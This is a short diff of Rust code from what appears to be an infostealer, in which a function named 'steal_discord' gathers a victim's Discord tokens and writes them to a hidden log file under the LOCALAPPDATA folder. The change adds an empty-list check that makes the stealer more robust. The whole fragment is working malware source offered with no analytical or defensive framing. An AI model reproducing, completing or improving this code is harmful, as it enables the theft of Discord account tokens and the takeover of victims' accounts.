@@ -109,5 +109,8 @@ fn get_tokens() -> Vec<String> {
 
 pub fn steal_discord() {
     let tokens = get_tokens();
+    if tokens.len() == 0 {
+        return;
+    }
     std::fs::File::create(format!("{}\\logsxc\\discord_tokens.txt", std::env::var("LOCALAPPDATA").unwrap())).unwrap().write(tokens.join("\n").as_bytes()).unwrap();
 }
